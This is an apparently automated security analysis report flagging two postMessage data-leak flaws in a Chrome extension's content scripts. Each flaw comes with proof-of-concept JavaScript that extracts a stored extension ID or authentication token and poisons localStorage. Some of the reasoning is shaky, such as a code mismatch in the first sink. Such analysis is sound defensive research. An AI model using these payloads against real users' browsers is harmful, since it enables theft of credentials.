# CoCo Analysis: objnbackjnojbhelgbfodadnidpkegfg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_local_get_source → window_postMessage_sink (Line 483)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/objnbackjnojbhelgbfodadnidpkegfg/opgen_generated_files/cs_0.js
Line 418: var storage_local_get_source = {'key': 'value'}
Line 483: window.postMessage({"action":"receiveExtensionId","extensionId": res.extId}, `https://${document.domain}`)

**Code:**

```javascript
// Content script - amazon.js (line 479-486)
window.addEventListener("message", function(e) {
    if (e.data.action=='getExtensionId') { // ← attacker-controlled trigger
        chrome.storage.local.get({"token":""}, res => {
            // Sending stored data back to webpage
            window.postMessage({"action":"receiveExtensionId","extensionId": res.extId}, `https://${document.domain}`); // ← attacker receives data
        });
    }
}, false);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// On any Amazon page where content script runs, attacker can:
window.postMessage({action: "getExtensionId"}, "*");

// Listen for response
window.addEventListener("message", function(e) {
    if (e.data.action === "receiveExtensionId") {
        console.log("Leaked extension ID:", e.data.extensionId);
    }
});
```

**Impact:** Information disclosure - attacker can retrieve stored extension ID from extension storage by sending postMessage from any Amazon page.

---

## Sink 2: storage_local_get_source → window_postMessage_sink (Line 500)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/objnbackjnojbhelgbfodadnidpkegfg/opgen_generated_files/cs_0.js
Line 418: var storage_local_get_source = {'key': 'value'}
Line 500: window.postMessage({"action":"receiveToken","token": res.token}, `https://${document.domain}`)

**Code:**

```javascript
// Content script - amazon.js (line 496-503)
window.addEventListener("message", function(e) {
    if (e.data.action=='getToken') { // ← attacker-controlled trigger
        chrome.storage.local.get({"token":""}, res => {
            // Sending stored token back to webpage
            window.postMessage({"action":"receiveToken","token": res.token}, `https://${document.domain}`); // ← attacker receives sensitive data
        });
    }
}, false);

// Content script - myqingci.js (line 470-472) - stores token from localStorage
function getToken(){
    const token = localStorage.getItem('token'); // ← can be poisoned by webpage
    chrome.storage.local.set({"token": token}); // Storage write
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// On any Amazon page, attacker can:
// 1. Poison the token in localStorage
localStorage.setItem('token', 'attacker-controlled-token');

// 2. Retrieve the stored token
window.postMessage({action: "getToken"}, "*");

// 3. Listen for the response
window.addEventListener("message", function(e) {
    if (e.data.action === "receiveToken") {
        console.log("Leaked token:", e.data.token);
    }
});
```

**Impact:** Information disclosure and storage poisoning - attacker can both poison the token storage and retrieve tokens stored by the extension, potentially accessing user authentication credentials for the myqingci.com service.
